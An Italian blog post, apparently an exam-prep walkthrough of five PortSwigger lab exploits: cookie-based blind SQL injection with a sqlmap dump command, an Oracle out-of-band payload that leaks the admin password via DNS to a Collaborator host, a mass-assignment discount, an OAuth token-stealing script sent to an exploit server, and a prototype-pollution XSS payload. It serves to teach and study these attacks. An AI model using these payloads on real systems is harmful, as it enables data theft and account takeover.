---
layout: post
title: "Cinque roll nello step due: l'input ovvio non era mai il punto"
date: 2026-11-17
categories: [web-security, walkthrough]
tags: [portswigger, bscp, sql-injection, sqlmap, mass-assignment, oauth, prototype-pollution, dom-invader, mystery-lab, burp-suite]
excerpt: "Altri cinque roll di escalation dal mio Mystery Pool, e la stessa lezione che torna: scansiono il parametro ovvio, torna pulito, e il bug vero è una riga più su in un cookie, un campo che solo la GET rivela, o un 400 che mi dice in quale lab sono."
lang: it
page_id: five-rolls-into-step-two
permalink: /posts/five-rolls-into-step-two/
---

Ho scansionato il parametro `category` perché era quello ovvio — un filtro che prende input utente e lo infila in qualcosa che sapeva di query SQL. È tornato pulito. Non pulito come "sicuro"; pulito come "lo scanner non ha trovato niente", perché l'avevo puntato sul byte sbagliato. L'iniezione era una riga più su, nel cookie `TrackingId` — un campo che per poco saltavo, perché niente nell'interfaccia ti invita a toccarlo. Quel divario, tra l'input che la pagina ti porge e l'input di cui il server davvero si fida, si è rivelato essere tutto lo step due.

Il [post precedente]({% post_url 2026-11-16-csrf-token-legato-a-cookie-non-di-sessione %}) era il primo roll del secondo step del BSCP — privilege escalation — dal mio [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %}). Ho continuato a girare. Altri cinque roll, cinque vulnerabilità diverse, e al terzo avevo smesso di trattare lo schema come una coincidenza: in ognuno, l'input ovvio era un depistaggio, e il bug viveva dove il server *diceva* più di quanto l'UI mi lasciasse dire.

## Il setup

Stesso tool, card Escalation spuntata, livello Practitioner. Una cosa va nominata perché torna più sotto: parecchi di questi sono usciti come **topic diretti** — le categorie che il Mystery Lab non copre, che il mio tool pesca direttamente dalla pagina all-labs e apre col loro vero URL di launch. Il trade-off che ci ho messo dentro è che un lab diretto mostra il **titolo** appena carica, quindi la sorpresa finisce presto. Tre di questi cinque roll hanno spoilerato il proprio topic così. È un prezzo giusto — preferisco girare largo su tutto lo step due che tenere ogni titolo nascosto — ma è onesto dire che a volte la ruota ti dice cosa stai per affrontare.

Strumenti: Burp con lo scanner puntato sui singoli input (mai un crawl largo), Repeater, sqlmap per le blind SQLi, DOM Invader per la prototype pollution, Collaborator per il lavoro out-of-band.

## La sessione

### Roll 1 — Blind SQL injection, e il cookie che per poco saltavo

La home aveva un `GET /filter?category=...`. Injectable ovvio, quindi ho scansionato `category`. Niente. Quello che mi ha fermato dal ri-rollare è un'abitudine: scansiona *ogni* input della richiesta, cookie compresi. Così ho scansionato anche `TrackingId`, ed è lì che è atterrata la finding ad alta severità — **SQL injection**, confermata da Burp via *response diffing*:

```
TrackingId=0Ql8js2ZepUEwhwl' or '8625'='8625
```

Quel payload non estrae niente, non apre un UNION, non dorme — rende solo una condizione **vera** e guarda se la pagina reagisce. La pagina ha reagito: un messaggio *"Welcome back"* compariva nel vero e spariva nel falso. È una **boolean-based blind** SQLi — il dato non appare mai nella risposta, ma la *forma* della risposta ti dice sì/no. Come la distingui dalle altre famiglie, in fretta:

| Tecnica | Il tell |
|---|---|
| **B — boolean blind** | la risposta **cambia** vero vs falso, il dato non c'è |
| U — UNION | il dato appare **in pagina** |
| E — error-based | l'**errore** del DB porta il dato |
| T — time blind | la risposta non cambia mai, cambia solo il **ritardo** |

Siccome l'oracolo era così netto, sono andato di sqlmap. Il trucco con un'iniezione nel cookie è marcare il punto con `*` così non spreca tempo a fuzzare `category`:

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" \
  --cookie="TrackingId=0Ql8js2ZepUEwhwl*; session=YOUR-SESSION" \
  --batch --dbms=postgresql --technique=B --string="Welcome back" \
  -D public -T users -C username,password --dump --threads=10
```

`--technique=B` perché *sapevo* già che era boolean (forzarla salta i probe time-based rumorosi), e `--string="Welcome back"` è tutto il gioco: è letteralmente "automatizza la cosa che controllerei a mano". Il dump è uscito al primo colpo:

```
administrator | 0bka427y63nnqd439068
carlos        | hv6602gbsv4u6q3j5omh
wiener        | w8078twwa6rdgo2gejfb
```

Login come administrator, fatto. **La lezione non è la SQLi, è dove viveva**: i cookie sono punti d'iniezione, e lo scanner trova solo ciò che gli punti.

### Roll 2 — Mass assignment, ovvero il campo che solo la GET ammetteva

Un topic diretto (API testing), titolo spoilerato al caricamento: mass assignment. Il flusso di checkout aveva **sia GET sia POST** su `/api/checkout`. La POST che manda il browser è corta:

```json
{ "chosen_products":[{"product_id":"1","quantity":1}] }
```

Ma la **GET** sullo stesso endpoint restituisce la forma completa dell'oggetto ordine — incluso un campo che il form non manda mai:

```json
{ "chosen_discount": { "percentage": 0 }, "chosen_products":[...] }
```

Quel disallineamento — il server *rilegge* un campo che non lascia mai *scrivere* all'UI — è tutta la vulnerabilità. Il framework fa auto-binding del JSON in ingresso sull'oggetto ordine senza whitelist, quindi tutto ciò che l'oggetto ha, tu lo puoi settare. Ho copiato `chosen_discount` nella POST e l'ho spinto al limite:

```json
{
"chosen_discount":{"percentage":100},
"chosen_products":[{"product_id":"1","quantity":1}]}
```

Sconto 100%, ordine piazzato, comprata la jacket che non potevo permettermi. Lo step di identificazione qui è un diff: **confronta i campi che l'API restituisce con i campi che l'UI invia; quelli in più sono i tuoi candidati.** Indovinare i nomi alla cieca (`isAdmin`, `credit`) è il rabbit hole — la risposta GET ti porge quello vero gratis. (Piccolo tell per dopo: la POST partiva come `Content-Type: text/plain`, una simple request che scansa il preflight CORS — il genere di lassismo che dice che questa API si fida dell'input in più di un punto.)

### Roll 3 — Lo stesso cookie, un canale diverso

Il roll dopo sembrava il roll 1 con lo stesso vestito — `GET /filter?category=...`, un cookie `TrackingId` — e stavolta ho scansionato il cookie *per primo*, perché il roll 1 me l'aveva insegnato. SQL injection di nuovo, stesso sink. Ma il payload che lo scanner ha piazzato era tutto un altro animale:

```sql
' || (select extractvalue(xmltype(
  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-ID.oastify.com/"> %remote;]>'
), '/l') from dual) || '
```

Tre cose da leggerci. **È Oracle** — `xmltype`, `extractvalue`, `from dual` sono il fingerprint. **È out-of-band** — la risposta della pagina non cambia *affatto*, quindi non c'è oracolo booleano come nel roll 1; il payload fa invece aprire al *database stesso* una connessione verso il mio Collaborator, tramite una XXE contrabbandata dentro la SQL. E l'hostname è **spezzato con `'||'`** (`...oasti' || 'fy.com`) perché il tutto vive dentro una stringa SQL e viene concatenato a runtime.

Metti il roll 1 e il roll 3 fianco a fianco e il punto si scrive da solo: **sink identico, lo stesso cookie `TrackingId`, ma il canale di rilevamento è completamente diverso.** Il roll 1 ti risponde attraverso la pagina (booleano in-band); il roll 3 non dice nulla a schermo e parla via DNS (out-of-band). L'obiettivo del lab era solo l'interazione — una riga nel log di Collaborator lo risolveva. Ma l'upgrade che conta all'esame è spostare il dato nel sottodominio:

```sql
...<!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-ID.oastify.com/">...
```

e leggere la password dell'admin dal prefisso DNS. OAST è il canale a cui ricorri quando la pagina non ti dà *niente* — costringi il server a rispondere *a te*.

### Roll 4 — Il 400 che mi ha detto in quale lab ero

Di nuovo un topic diretto, OAuth. Noto che il login passava da un provider OAuth, leggo la richiesta di autorizzazione, e due cose saltano fuori:

```
GET /auth?client_id=...&redirect_uri=https://LAB/oauth-callback
         &response_type=token&nonce=...&scope=openid profile email
```

`response_type=token` è l'**implicit flow**: il provider ti rimanda l'access token direttamente, nel **fragment** dell'URL del `redirect_uri`. Il che significa che chi controlla dove quell'URL atterra si prende il token. Quindi ho puntato il `redirect_uri` al mio exploit server — e mi sono fermato:

```
400  error: redirect_uri_mismatch
     redirect_uri did not match any of the client's registered redirect_uris
```

Ecco il pezzo che voglio segnalare, perché per poco mi costava: stavo per prendere il write-up di *"OAuth account hijacking via redirect_uri"* — un lab che sembra identico — e seguirlo dritto in un muro. Quel lab ha un `redirect_uri` *lasco* (puntalo ovunque, nessun errore). Il mio ha risposto `redirect_uri_mismatch`. **L'errore è il discriminatore**:

| | Account hijacking via redirect_uri | **Stealing tokens via open redirect (il mio)** |
|---|---|---|
| `response_type` | `code` | **`token`** |
| validazione `redirect_uri` | lasca — accetta tutto | **stretta — `redirect_uri_mismatch`** |
| la via d'ingresso | puntalo al tuo server | **concatena un open redirect sul sito** |

Quindi il `400` non era un muro, era un cartello: *non puoi andare diretto, ti serve un open redirect sul dominio permesso.* Due debolezze combinate aggirano la whitelist. Primo, la validazione controlla solo il **prefisso**, quindi un path traversal la passa:

```
redirect_uri=https://LAB/oauth-callback/../post?postId=1
```

comincia con `/oauth-callback` (whitelist contenta), e il browser normalizza `/oauth-callback/../post` → `/post`. Questo mi ha portato sul sito, ma ancora *sul dominio del lab*, col token bloccato in un fragment che non potevo leggere. La seconda debolezza era l'**open redirect** nel link "next post" del blog — `/post/next?path=` prendeva qualsiasi URL esterno e ci rimbalzava dritto. Concatenali:

```
redirect_uri=https://LAB/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER/exploit/
```

Il pezzo che fa funzionare tutto è una regola del browser: **il fragment sopravvive al redirect.** Segui un `302` verso una location senza un suo fragment, e il browser riattacca l'`#access_token=...` originale. Così il token cavalca l'open redirect fino al mio server. L'exploit è a due fasi, perché il fragment da solo non raggiunge mai un server:

```html
<script>
  if (!document.location.hash) {
    // fase 1 — nessun token: manda la vittima nel flusso OAuth
    window.location = 'https://oauth-SERVER/auth?client_id=CLIENT'
      + '&redirect_uri=https://LAB/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER/exploit/'
      + '&response_type=token&nonce=-394297768&scope=openid%20profile%20email';
  } else {
    // fase 2 — ritorno col #access_token: trasformalo in query string e loggalo
    window.location = '/?' + document.location.hash.substr(1);
  }
</script>
```

Deliver to victim (l'admin, che tiene una sessione OAuth attiva), leggi il suo access token dal mio access log, e spendilo:

```http
GET /me HTTP/2
Host: LAB
Authorization: Bearer STOLEN-ADMIN-TOKEN
```

La risposta portava l'API key dell'admin. Due rabbit hole da nominare: credere che `redirect_uri_mismatch` sia un vicolo cieco (è l'indizio), e fermarsi alla fase 1 — il fragment resta nel browser e non tocca mai il tuo log finché la fase 2 non lo converte in query string.

### Roll 5 — Prototype pollution, e l'onestà di una vittoria facile

Ultimo roll, un altro topic diretto col titolo in chiaro: *DOM XSS via client-side prototype pollution*. Sarò diretto — questo è stato tre click, e la parte onesta della storia è *perché* è stato tre click.

DOM Invader, col rilevamento prototype pollution attivo, ha subito segnalato una **source**: `__proto__[property]=value in search`. In parole povere, la pagina trasforma la query string in un oggetto in un modo che lascia `?__proto__[x]=y` scrivere su `Object.prototype` — il prototype da cui ogni oggetto eredita. Avvelenalo, e una proprietà che era `undefined` ovunque diventa di colpo tua ovunque. È solo metà exploit, però; la pollution non fa nulla finché un pezzo di codice non *legge* una proprietà avvelenata e la passa a un sink. Quindi: **Scan for gadgets**, e DOM Invader ne ha trovato uno — un **sink `script.src`** raggiunto tramite una proprietà-gadget chiamata `transport_url`. Da qualche parte la pagina fa più o meno:

```js
if (config.transport_url) {
  const s = document.createElement('script');
  s.src = config.transport_url;   // sink
  document.body.appendChild(s);
}
```

`config.transport_url` è normalmente `undefined`, quindi non succede niente — finché la prototype pollution fa ereditare a `config` il mio valore. Il payload che DOM Invader ha generato:

```
/?__proto__[transport_url]=data:,alert(document.cookie)
```

La query avvelena `Object.prototype.transport_url`, `config.transport_url` eredita il `data:` URI, la pagina lo setta come `src` di uno script, e il `data:` URI esegue. Lab risolto.

Ecco la nota onesta che la voce del diario pretende: **DOM Invader l'ha reso facile, e facile non è la stessa cosa di capito.** Il tool ha automatizzato tutta la catena — source, gadget, exploit — ma all'esame, nel momento in cui il gadget non è nella sua lista, o la source è dietro una merge custom, torni a farlo a mano: confermi la source in console (`?__proto__[x]=y`, poi controlli `Object.prototype.x`), cacci il gadget nel JavaScript, costruisci il payload. Quello che devi portarti via non è il click; è *quale proprietà, letta da quale codice, finisce in quale sink.*

## Il pattern

Cinque roll, una forma sola. In ognuno, **l'input ovvio era un depistaggio, e la vulnerabilità viveva dove il server rivelava più di quanto l'UI mi invitasse a mandare:**

- un **cookie** che finiva in una query SQL, non il parametro visibile `category` (roll 1 e 3);
- un **campo che la GET restituiva** ma il form non inviava mai (roll 2);
- un **database che rispondeva via DNS** quando la pagina taceva (roll 3);
- un **provider che rimandava un token in un fragment**, dove un `400` indicava la via d'ingresso (roll 4);
- un **parametro in query che scriveva su `Object.prototype`**, facendo emergere una proprietà che nessun form espone (roll 5).

E il metodo non è mai cambiato: **leggi quello che il server ti restituisce prima di tirargli payload.** Lo scan pulito su `category`, il `chosen_discount` nel body della GET, il payload `extractvalue` dello scanner stesso, l'errore `redirect_uri_mismatch`, il pannello source di DOM Invader — ognuno mi *diceva* dov'era l'input vero. Identificazione prima dello sfruttamento. Un errore è informazione, non un muro.

Il secondo filo è più sottile: **il sink non sceglie la tecnica; la decide la realtà intorno.** Roll 1 e 3 erano la stessa identica SQLi nello stesso identico cookie, e una era booleana in-band mentre l'altra out-of-band — il canale era dettato dal fatto che la pagina rispondesse o no, non dall'iniezione. L'intero exploit del roll 4 ruotava su una regola del browser sui fragment. La severità del roll 5 la decideva quale gadget capitasse di esistere. Identifichi il sink per sapere *dove* sei; il contesto esatto ti dice *come* uscirne.

## Esame e campo

**All'esame**, tutti e cinque sono Stage 2 — privilege escalation, ognuno una strada diversa verso l'account di qualcun altro. I tell di riconoscimento sono concreti e vanno sovra-allenati, perché il cronometro si vince sull'identificazione, non sulla furbizia: scansiona *ogni* input, cookie compresi (la SQLi si nasconde lì); fai il diff tra la forma in lettura dell'API e quella in scrittura (mass assignment); vai di OAST appena un'iniezione è confermata ma la pagina tace; leggi `response_type` e l'errore sul `redirect_uri` per distinguere i due lab OAuth *prima* di scegliere l'exploit; lancia DOM Invader con prototype pollution attivo e lascialo trovare la source, poi capisci il gadget che ti porge. I profili di interazione differiscono e all'esame conta: la SQLi e la mass assignment sono **non-interattive** (interroghi il server tu), mentre il furto OAuth e una prototype-pollution XSS armata sono **interattive** — serve che l'admin apra il tuo link, ed è lì che tornano i trucchi di delivery dello step uno.

**Sul campo**, la classifica è per raggio d'esplosione. La blind SQLi esfiltra tutta la tabella utenti; la mass assignment è un buco di logica che scala a qualunque campo sensibile l'oggetto contenga (`isAdmin`, `balance`, `role`); la falla OAuth consegna sessioni vive; e la prototype pollution è quella strutturale e silenziosa — una classe di bug endemica nell'ecosistema JavaScript, gadget client-side che portano a DOM XSS in script di terze parti, e pollution server-side che scala fino a RCE, bypass di privilegi o DoS nelle app Node. L'unica disciplina che avrebbe chiuso quasi tutti: non fidarti mai di un input perché l'UI non te l'ha offerto — cookie, campi JSON extra, chiavi `__proto__` e valori `redirect_uri` sono tutti controllati dall'attaccante, e il server deve trattarli così prima di leggerne un byte.

## Cosa viene dopo

Lo step due è quasi risolto ora — sei roll in due post, e la fase di escalation ha mostrato la sua mano: è account takeover per qualunque strada il bersaglio lasci aperta. Il filo aperto è la prototype pollution server-side, l'unica variante che il mio tool mette sotto *exfiltration* invece che escalation, perché il suo finale è remote code execution e non una sessione rubata — che è esattamente il ponte verso lo step tre. La ruota è puntata lì, adesso.

## Takeaways

- L'input ovvio di solito è il depistaggio: scansiona ogni input, **cookie** compresi, e la SQLi vera (o peggio) è spesso una riga più su del parametro che hai guardato per primo.
- La mass assignment è un diff: confronta i campi che l'**API restituisce** con quelli che l'**UI invia** — quelli in più (`chosen_discount`, `isAdmin`) sono i tuoi candidati; non indovinarli alla cieca.
- Il sink non sceglie la tecnica. La stessa SQLi nello stesso cookie era booleana in-band in un lab e out-of-band in un altro — OAST è il canale che usi quando la pagina non ti risponde con nulla.
- `redirect_uri_mismatch` è un cartello, non un muro: ti dice che sei nel lab *open-redirect*, non in quello col `redirect_uri` lasco — leggi `response_type` e l'errore prima di copiare qualsiasi write-up.
- DOM Invader rende la prototype pollution client-side tre click, ma facile non è capito: conosci la catena source → gadget → sink a mano, perché l'esame ti porgerà un gadget che il tool non elenca.

## Riferimenti utili

- [PortSwigger: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
- [PortSwigger: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
- [PortSwigger: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
- [PortSwigger: Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
- [PortSwigger: DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/dom-xss)
- [PortSwigger: Client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [sqlmap](https://sqlmap.org/) · [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [botesjuan — Burp Suite Certified Practitioner Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
- [Mystery Pool — il tool da cui vengono questi roll]({% post_url 2026-10-04-mystery-pool-strumento %})

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato (la Web Security Academy di PortSwigger). Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
